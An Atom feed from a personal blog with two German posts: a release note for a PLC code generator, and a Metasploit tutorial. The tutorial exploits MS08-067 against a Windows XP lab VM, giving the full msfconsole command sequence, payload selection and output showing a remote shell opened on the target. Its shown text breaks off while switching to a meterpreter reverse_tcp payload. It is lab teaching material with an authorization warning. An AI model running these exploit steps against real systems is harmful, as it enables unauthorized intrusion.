<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="https://dg60.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dg60.github.io/" rel="alternate" type="text/html" /><updated>2024-05-29T18:40:34+02:00</updated><id>https://dg60.github.io/feed.xml</id><title type="html">x44 x4d x47</title><subtitle>Homepage of Daniel Grill</subtitle><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><entry xml:lang="DE"><title type="html">Code Generator Beta Release</title><link href="https://dg60.github.io/Code-Generator-BETA-Release/" rel="alternate" type="text/html" title="Code Generator Beta Release" /><published>2018-12-15T00:00:00+01:00</published><updated>2018-12-15T00:00:00+01:00</updated><id>https://dg60.github.io/Code-Generator-BETA-Release</id><content type="html" xml:base="https://dg60.github.io/Code-Generator-BETA-Release/"><![CDATA[<p>Hallo,</p>

<p>Heute ist es endlich soweit das ein kleines nützliches Tool das Licht der Welt erblickt, und endlich getestet werden kann. Das neue Tool hat den nicht sehr kreativen Name <strong>CodeGenerator for PLC´s</strong>, aber der Name kann sich ja noch ändern :). Wie der Name schon verrät lässt sich damit Code für verschiedenen PLC´s(SPS´sen) erzeugen.</p>

<p><img src="/images/works/CodeGenerator/CodeGen_BuR.png" alt="image-center" class="align-center" /></p>

<p>Für den ersten Beta Release werden folgende Sprachen und Steuerungen unterstützt:</p>
<ul>
  <li>B&amp;R Automation Studio 4.x.x
    <ul>
      <li>Structured Text (ST EN 61131-3)</li>
    </ul>
  </li>
  <li>Siemens TIA_V15
    <ul>
      <li>Structured Text (SCL)</li>
    </ul>
  </li>
</ul>

<p>Das ausführbare Programm steht für folgenden Platformen zur Verfügung:</p>
<ul>
  <li>Linux
    <ul>
      <li>Ubuntu 16.04</li>
      <li>Ubuntu 18.04</li>
    </ul>
  </li>
  <li>Windows 7, 10</li>
</ul>

<h2 id="mehr-informationen">Mehr Informationen</h2>

<p>Projektbeschreibung und Dokumentation:  <br />
<a href="/portfolio/05-CodeGenerator-(DE)/">CodeGenerator for PLC´s</a></p>

<p>CodeGenerator für Linux und Windows:<br />
<a href="/downloads">CodeGenerator_BETA_V0.9.0</a></p>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[Codegenerator]]></summary></entry><entry xml:lang="DE"><title type="html">Metasploit</title><link href="https://dg60.github.io/Metasploit/" rel="alternate" type="text/html" title="Metasploit" /><published>2018-01-04T00:00:00+01:00</published><updated>2018-01-04T00:00:00+01:00</updated><id>https://dg60.github.io/Metasploit</id><content type="html" xml:base="https://dg60.github.io/Metasploit/"><![CDATA[<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">It´s time to hack</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Hallo,</p>

<p>Heute möchte ich euch kurz das <a href="https://metasploit.com/">Metasploit</a> Framework vorstellen. Das Metasploit Framework dient ist erster Linie zur Entwicklung und Ausführung von Exploits.</p>

<p><img src="/images/docs/metasploit.png" alt="image-center" class="align-center" /></p>

<h2 id="installation">Installation</h2>

<p>Der einfachste weg ist es die Kali Linux Distribution von <a href="https://www.kali.org/">Kali.org</a> herunter zu laden. Die Distribution gibt es als live Image oder als Abild einer Virtuelle Maschine für die Hypervisoren Vmware Player/Virtual Box auf der Seite von <a href="https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/">Offense Security</a>.</p>

<p>Es ist jedoch auch ohne weiteres möglich Metasploit wie jedes andere Programm zu installieren. <a href="https://metasploit.com/">RAPID 7/Metasploit</a> stellt die Binaries für alle gängigen Betriebsysteme(Linux, MacOS, Windows) zur verfügung.</p>

<h2 id="testumgebung">Testumgebung</h2>

<p>Zum arbeiten mit Metasploit ist unerlässlich sich eine Testumgebung einzurichten. Besonders gut geeignet sind dafür ältere ungepatche OS Versionen wie z.B:</p>

<ul>
  <li>Windows 2000</li>
  <li>Windows XP SP1 - SP3</li>
  <li>Windows 7 (ohne Service Pack)</li>
  <li>Ubuntu 08.04</li>
  <li>usw.</li>
</ul>

<p>Aktuelle und gepachte OS-Versionen von Windows und Linux geben keine guten Ziele ab das es meist keine fertig entwickelten exploits dafür gibt.</p>

<p>Eine weitere Möglichkeit ist der Download von vorgefertigten OS-Images die absichtlich mit schwachstellen versehen wurden. Diese Images eignen sicher hevoragend für die ersten Schritte mit Metasploit.</p>

<p>Metasploitable 2:
<a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">https://sourceforge.net/projects/metasploitable/files/Metasploitable2/</a></p>

<p>Metasploitable 3:<br />
<a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></p>

<h2 id="arbeiten-mit-metasploit">Arbeiten mit Metasploit</h2>

<p class="notice--danger"><strong>Achtung !!! Bitte führt keine Exploits oder Scans gegen Rechner, Webseiten,Datenbanken usw. aus wozu ihr nicht berechtigt seid.</strong></p>

<p>Für die folgenden Beispiele verwende ich eine Virtuelle Maschine mit Windows XP SP3. Die ich bereits in meiner Einführung für den Portscanner <a href="/NMAP">NMAP</a> verwendet habe.</p>

<p>Ziel OS: Windows XP SP3<br />
Bekannte Schwachstelle: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250">CVE-2008-4250</a><br />
Exploit: <a href="https://blog.rapid7.com/2014/02/03/new-ms08-067/">https://blog.rapid7.com/2014/02/03/new-ms08-067/</a></p>

<p><u>Nmap Ausgabe:</u></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure <span class="nb">date</span>: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
</code></pre></div></div>
<h3 id="msfconsole">msfconsole</h3>
<p>1.) Metasploit starten wir mit dem Befehl <strong>msfconsole</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole
</code></pre></div></div>

<p>2.) Wurde Metasploit erfolgreich gestartet erhalten wir einen der möglichen Willkommens Bildschirme</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Call trans opt: received. 2-19-98 13:24:18 REC:Loc
     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        <span class="o">(</span><span class="sb">`</span><span class="nb">.</span>         ,-,
                        <span class="sb">`</span> <span class="sb">`</span><span class="nb">.</span>    ,<span class="p">;</span><span class="s1">' /
                         `.  ,'</span>/ .<span class="s1">'
                          `. X /.'</span>
                .-<span class="p">;</span><span class="nt">--</span><span class="s1">''</span><span class="nt">--</span>.._<span class="sb">`</span> <span class="sb">`</span> <span class="o">(</span>
              .<span class="s1">'            /   `
             ,           ` '</span>   Q <span class="s1">'
             ,         ,   `._    \
          ,.|         '</span>     <span class="sb">`</span>-.<span class="p">;</span>_<span class="s1">'
          :  . `  ;    `  ` --,.._;
           '</span> <span class="sb">`</span>    ,   <span class="o">)</span>   .<span class="s1">'
              `._ ,  '</span>   /_
                 <span class="p">;</span> ,<span class="s1">''</span>-,<span class="p">;</span><span class="s1">' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v4.16.31-dev                         ]
+ -- --=[ 1726 exploits - 992 auxiliary - 300 post        ]
+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
msf &gt; 
</span></code></pre></div></div>

<p>3.) Nach der Installation empfiehlt es sich einen rebuild des Datenbank Cache durchzuführen oder wenn diese Meldung angezeigt wird “Database not connected or cache not built, using slow search”.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; db_rebuild_cache  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Purging and rebuilding the module cache <span class="k">in </span>the background...
</code></pre></div></div>
<h3 id="search">search</h3>
<p>4.) Mit diesen wissen das unser Ziel über eine bekannte Schwachstelle verfügt. Können wir in der Metasploit Datenbank nach einen geeigneten Exploit suchen.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; search  ms08
Matching Modules
<span class="o">================</span>

   Name                                                   Disclosure Date  Rank       Description
   <span class="nt">----</span>                                                   <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----------</span>
   auxiliary/admin/ms/ms08_059_his2006                    2008-10-14       normal     Microsoft Host Integration Server 2006 Command Execution Vulnerability
   exploit/windows/browser/ms08_041_snapshotviewer        2008-07-07       excellent  Snapshot Viewer <span class="k">for </span>Microsoft Access ActiveX Control Arbitrary File Download
   exploit/windows/browser/ms08_053_mediaencoder          2008-09-09       normal     Windows Media Encoder 9 wmex.dll ActiveX Buffer Overflow
   exploit/windows/browser/ms08_070_visual_studio_msmask  2008-08-13       normal     Microsoft Visual Studio Mdmask32.ocx ActiveX Buffer Overflow
   exploit/windows/browser/ms08_078_xml_corruption        2008-12-07       normal     MS08-078 Microsoft Internet Explorer Data Binding Memory Corruption
   exploit/windows/smb/ms08_067_netapi                    2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
   exploit/windows/smb/smb_relay                          2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution

</code></pre></div></div>
<h3 id="use-exploit">use exploit</h3>
<p>5.) Um einen Exploit auszuwählen verwenden wir den Befehl <strong>use</strong> und geben den Pfad des exploits an.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; use exploit/windows/smb/ms08_067_netapi 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Purging and rebuilding the module cache <span class="k">in </span>the background...
</code></pre></div></div>
<h3 id="show-options">show options</h3>
<p>6.) Mit dem Befehl <strong>show options</strong> können wir uns alle verfügbaren Optionen anzeigen lassen</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOST                     <span class="nb">yes       </span>The target address
   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic Targeting

</code></pre></div></div>
<h3 id="set">set</h3>
<p>7.) Mit <strong>set</strong> RHOST setzen wir die IP Adresse für den Ziel Rechner. Mein Ziel System hat die IP Adresse 192.168.1.110</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST 192.168.1.110
RHOST <span class="o">=&gt;</span> 192.168.1.110
</code></pre></div></div>
<h3 id="show-payloads">show payloads</h3>
<p>8.) Mittels <strong>show payloads</strong> können wir uns alle verfügbaren Payloads anzeigen lassen.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show payloads

Compatible Payloads
<span class="o">===================</span>

   Name                                                Disclosure Date  Rank    Description
   <span class="nt">----</span>                                                <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----------</span>
   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind Ipknock TCP Stager
   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind TCP Stager
   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Hop HTTP/HTTPS Stager
   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTP Stager <span class="o">(</span>wininet<span class="o">)</span>
   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTPS Stager <span class="o">(</span>wininet<span class="o">)</span>
   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse HTTPS Stager with Support <span class="k">for </span>Custom Proxy
   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
   windows/meterpreter/reverse_named_pipe                               normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows x86 Reverse Named Pipe <span class="o">(</span>SMB<span class="o">)</span> Stager
   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager
   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager with UUID Support
   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind Ipknock TCP Stager
   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind TCP Stager
   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/vncinject/bind_tcp                                           normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
   windows/vncinject/reverse_hop_http                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Hop HTTP/HTTPS Stager
   windows/vncinject/reverse_http                                       normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTP Stager <span class="o">(</span>wininet<span class="o">)</span>
   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
   windows/vncinject/reverse_tcp                                        normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager
   windows/vncinject/reverse_tcp_allports                               normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse All-Port TCP Stager
   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager with UUID Support

</code></pre></div></div>

<h3 id="set-payload">set payload</h3>
<p>9.) Wir entscheiden uns hier für den <strong>windows/shell/bind_tcp</strong> payload.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/shell/bind_tcp
payload <span class="o">=&gt;</span> windows/shell/bind_tcp
</code></pre></div></div>

<h3 id="show-options-payload">show options (Payload)</h3>
<p>10.) Nach auswahl des Payload prüfen wir mit <strong>show options</strong> ob der ausgewählte Payload noch zusätzliche Einstellungen benötigt. Die benötigten Optionen sind mit <strong>Required yes</strong> markiert und sollte ein Payload einmal fehlschlagen empfiehlt es sich noch einmal alle Optionen zu prüfen.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>


Payload options <span class="o">(</span>windows/shell/bind_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LPORT     4444             <span class="nb">yes       </span>The listen port
   RHOST     192.168.1.110    no        The target address


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic Targeting

</code></pre></div></div>

<h3 id="exploit">exploit</h3>
<p>10.) Nun ist unser exploit richtig konfiguriert und kann mit dem Befehl <strong>exploit</strong> gestartet werden.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started <span class="nb">bind </span>handler
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Automatically detecting the target...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - We could not detect the language pack, defaulting to English
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Attempting to trigger the vulnerability...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encoded stage with x86/shikata_ga_nai
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending encoded stage <span class="o">(</span>267 bytes<span class="o">)</span> to 192.168.1.110
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.243:35797 -&gt; 192.168.1.110:4444<span class="o">)</span> at 2018-01-31 22:05:37 +0100

Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;

</code></pre></div></div>

<h3 id="auf-dem-zielsystem">Auf dem Zielsystem</h3>
<p>11.) War der Exploit erfolgreich erhalten wir eine Windows Command prompt. Der Beweis das wir uns wirklich auf dem Zielsystem befinden ist ganz unten die IP Adresse 192.168.1.110 !</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;systeminfo
systeminfo

Host Name:                 IE6WINXP
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          IEUser
Registered Organization:   
Product ID:                76487-024-5236883-22915
Original Install Date:     10/12/2012, 1:45:14 PM
System Up Time:            21350397 Days, 20 Hours, 44 Minutes, 4 Seconds
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System <span class="nb">type</span>:               X86-based PC
Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
                           <span class="o">[</span>01]: x86 Family 21 Model 1 Stepping 2 AuthenticAMD ~3896 Mhz
BIOS Version:              VBOX   - 1
Windows Directory:         C:<span class="se">\W</span>INDOWS
System Directory:          C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32
Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
System Locale:             en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
Time Zone:                 <span class="o">(</span>GMT-08:00<span class="o">)</span> Pacific Time <span class="o">(</span>US &amp; Canada<span class="o">)</span><span class="p">;</span> Tijuana
Total Physical Memory:     511 MB
Available Physical Memory: 388 MB
Virtual Memory: Max Size:  2,048 MB
Virtual Memory: Available: 2,008 MB
Virtual Memory: In Use:    40 MB
Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
Domain:                    MSHOME
Logon Server:              N/A
Hotfix<span class="o">(</span>s<span class="o">)</span>:                 16 Hotfix<span class="o">(</span>s<span class="o">)</span> Installed.
                           <span class="o">[</span>01]: File 1
                           <span class="o">[</span>02]: File 1
                           <span class="o">[</span>03]: File 1
                           <span class="o">[</span>04]: File 1
                           <span class="o">[</span>05]: File 1
                           <span class="o">[</span>06]: File 1
                           <span class="o">[</span>07]: Q147222
                           <span class="o">[</span>08]: KB952069_WM9
                           <span class="o">[</span>09]: KB954155_WM9
                           <span class="o">[</span>10]: KB973540_WM9
                           <span class="o">[</span>11]: KB2749655 - Update
                           <span class="o">[</span>12]: KB952287 - Update
                           <span class="o">[</span>13]: KB955759 - Update
                           <span class="o">[</span>14]: KB968389 - Update
                           <span class="o">[</span>15]: KB971029 - Update
                           <span class="o">[</span>16]: KB973815 - Update
NetWork Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
                           <span class="o">[</span>01]: AMD PCNET Family PCI Ethernet Adapter
                                 Connection Name: Local Area Connection 5
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.1.1
                                 IP address<span class="o">(</span>es<span class="o">)</span>
                                 <span class="o">[</span>01]: 192.168.1.110

</code></pre></div></div>

<h2 id="meterpreter">Meterpreter</h2>

<h3 id="set-payload-meterpreter">set payload meterpreter</h3>
<p>1.) Wir entscheiden uns hier für den <strong>windows/meterpreter/reverse_tcp</strong> payload.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
</code></pre></div></div>

<h3 id="show-options-1">show options</h3>
